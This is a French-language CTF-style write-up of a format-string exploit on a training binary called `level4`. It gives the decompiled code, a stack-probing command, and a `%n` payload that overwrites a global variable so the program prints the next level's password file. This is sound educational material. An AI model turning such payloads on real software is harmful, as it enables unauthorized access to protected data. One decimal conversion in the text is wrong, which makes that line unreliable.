### README - Exploitation du programme `level4`

## Introduction

Nous avons un exécutable `level4` avec les options suivantes :

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
```

### Code source décompilé

Voici le code source décompilé du programme `level4` :

```c
void p(char *param_1) {
  printf(param_1);
  return;
}

void n(void) {
  char local_20c[520];
  
  fgets(local_20c, 0x200, stdin);
  p(local_20c);
  if (m == 0x1025544) {
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}

void main(void) {
  n();
  return;
}
```

### Analyse de la vulnérabilité

La fonction `p` utilise `printf` avec un argument utilisateur sans spécificateur de format, ce qui est vulnérable à une attaque par chaîne de format. La condition pour exécuter la commande `system` est que la variable `m` soit égale à `0x1025544`.

### Identification de la position de l'argument

Pour exploiter la vulnérabilité, nous devons trouver la position de notre chaîne injectée dans les arguments de `printf`.

1. **Utilisation d'une chaîne de format exploratoire pour afficher les valeurs sur la pile** :

   ```bash
   python -c 'print "AAAA" + " %x" * 20' | ./level4
   ```

2. **Analyse de la sortie** :

   ```
   AAAA b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825
   ```

   Nous voyons `0x41414141` (qui représente "AAAA" en ASCII) à la 12ème position dans la sortie. Cela signifie que notre chaîne injectée est le 12ème argument de `printf`.

### Construction du payload

Nous devons construire un payload qui écrit `0x1025544` (16850436 en décimal) à l'adresse de la variable `m`.

1. **Inclure l'adresse de `m` en format little-endian** :

   ```bash
   python -c 'print("\x10\x98\x04\x08")' > /tmp/exploit
   ```

2. **Ajouter la chaîne de format pour écrire `0x1025544`** :

   ```bash
   echo -ne "%016930112x%12\$n" >> /tmp/exploit
   ```

### Exécution du payload

Pour exploiter le programme `level4` :

```bash
cat /tmp/exploit - | ./level4
```

### Vérification

Après l'exploitation, le programme devrait afficher le contenu de `/home/user/level5/.pass`.

## Déroulement complet

### 1. Identification de la position de l'argument

```bash
python -c 'print "AAAA" + " %x" * 20' | ./level4
```

Sortie :

```
AAAA b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825
```

### 2. Construction du payload

#### a. Générer la partie initiale du payload

```bash
python -c 'print("\x10\x98\x04\x08")' > /tmp/exploit
```

#### b. Ajouter la chaîne de format

```bash
echo -ne "%016930112x%12\$n" >> /tmp/exploit
```

### 3. Exécution du payload

```bash
cat /tmp/exploit - | ./level4
```

### Conclusion

En utilisant cette approche, nous avons exploité la vulnérabilité de chaîne de format pour modifier la variable `m` et déclencher la condition qui exécute la commande système pour afficher le contenu de `/home/user/level5/.pass`.

### Code source décompilé pour explication

Voici à nouveau le code source décompilé pour une explication plus claire :

```c
void p(char *param_1) {
  printf(param_1);
  return;
}

void n(void) {
  char local_20c[520];
  
  fgets(local_20c, 0x200, stdin);
  p(local_20c);
  if (m == 0x1025544) {
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}

void main(void) {
  n();
  return;
}
```

### Explication

- **`fgets`** : Lit l'entrée utilisateur dans un buffer.
- **`printf`** : Affiche le buffer sans spécificateur de format, rendant le programme vulnérable aux attaques de chaîne de format.
- **Condition sur `m`** : Si `m` vaut `0x1025544`, le programme exécute `system("/bin/cat /home/user/level5/.pass")`.

En utilisant la vulnérabilité de chaîne de format, nous avons écrit `0x1025544` à l'adresse de `m` pour satisfaire cette condition et obtenir le mot de passe pour le niveau suivant.